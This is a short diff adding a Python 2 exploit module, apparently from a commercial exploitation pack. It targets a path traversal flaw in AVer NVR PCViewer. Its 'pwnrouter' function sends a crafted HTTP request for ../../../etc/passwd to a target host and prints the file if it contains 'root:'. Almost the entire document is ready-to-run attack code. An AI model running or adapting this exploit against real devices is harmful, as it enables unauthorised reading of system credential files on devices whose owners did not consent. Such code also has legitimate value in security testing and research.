@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import socket, hashlib
+
+_name_   = 'd2sec_aver_1'
+_vendor_ = 'aver'
+_model_  = ['NVR PCViewer']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+
+           
+                
+def pwnrouter(host,port=_port_):      
+  try:
+    data = "GET ../../../../../../../../../../../../etc/passwd HTTP/1.1\r\nHost: 77.157.65.31:4443\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n"    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+    s.connect((host, port))
+    s.sendall(data)
+    buff = s.recv(1024)      
+    buff += s.recv(1024)    
+    s.close()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if buff is None:
+    print '[+] %s not vulnerable' % host
+  if "root:" in buff:
+    print '[+] %s vulnerable\n' % host
+    print 'root:'+buff.split('root:',1)[1]
+  else:
+    print '[+] %s not vulnerable' % host      
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
